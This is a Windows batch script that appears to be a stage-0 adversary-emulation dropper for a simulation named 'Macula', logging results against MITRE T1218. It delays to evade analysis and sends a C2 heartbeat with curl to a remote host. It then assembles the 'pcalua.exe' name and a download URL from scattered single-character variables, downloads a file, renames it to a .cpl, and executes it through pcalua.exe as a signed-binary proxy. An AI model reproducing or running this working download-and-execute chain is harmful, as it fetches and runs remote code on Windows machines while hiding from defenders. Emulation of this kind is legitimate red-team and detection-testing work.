@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8529\75d434c6
SET fpakbq=Macula-Stage0-8529
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8529-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=control.txt
SET fpldhe=8529

REM Log file location
SET logvar=!APPDATA!\!yydue!\macula-simulations.log

REM Delay for evasion
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_start=45s>> "!logvar!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: initial_delay_complete>> "!logvar!" 2>nul

REM C2 heartbeat (NOT obfuscated)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start>> "!logvar!" 2>nul
curl -k -s -o nul "!rdzgrnne!"
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_complete>> "!logvar!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Create output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: mkdir_start=!yktnwwf!>> "!logvar!" 2>nul
IF NOT EXIST "!yktnwwf!" mkdir "!yktnwwf!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: mkdir_complete>> "!logvar!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul

REM Obfuscated variable chain for LOLBIN
SET vxrf=p
SET byhjm=c
SET gklz=a
SET dwqty=l
SET zbnk=u
SET pweq=a
SET omvk=.
SET tqne=e
SET rjmw=x
SET qvte=e
SET cmdpart1=!vxrf!!byhjm!!gklz!
SET cmdpart2=!dwqty!!zbnk!!pweq!
SET cmdpart3=!omvk!!tqne!!rjmw!!qvte!
CALL SET pcalbin=%%cmdpart1%%%%cmdpart2%%%%cmdpart3%%

SET /A delay=%RANDOM% %% 10 + 5
timeout /t %delay% /nobreak >nul

REM Build download URL with variable indirection
SET urlproto=http
SET urlsep=://
CALL SET fullurl=%%urlproto%%!urlsep!!repbmqg!/!edjwtl!

REM Download DLL
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_start=!fullurl!>> "!logvar!" 2>nul
curl -k -s -o "!yktnwwf!\!edjwtl!" "!fullurl!" 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: download_complete>> "!logvar!" 2>nul

timeout /t 10 /nobreak >nul

REM Rename to .cpl
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_start>> "!logvar!" 2>nul
ren "!yktnwwf!\!edjwtl!" pcafile.cpl 2>nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: rename_complete>> "!logvar!" 2>nul

ping -n 6 127.0.0.1 >nul

REM Obfuscated DLL path construction
SET pathprefix=!yktnwwf!\
SET filebase=pca
SET fileext=.cpl
CALL SET dllpath=%%pathprefix%%!filebase!!fileext!

REM Execute DLL via pcalua.exe with arguments split
SET argdash=-
SET arga=a
CALL SET fullargs=%%argdash%%!arga! !dllpath!

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_start>> "!logvar!" 2>nul
!pcalbin! !fullargs! 2>nul

IF ERRORLEVEL 1 (
    SET ttpresult=0
    SET errdetail=execution_failed
) ELSE (
    SET ttpresult=1
    SET errdetail=
)

REM TTP logging
SET dt=!DATE:/=-!
SET tm=!TIME: =!
echo [!dt! !tm!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed_Binary_Proxy_Execution=!ttpresult!:!errdetail!>> "!logvar!" 2>nul

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: execution_complete=!ttpresult!>> "!logvar!" 2>nul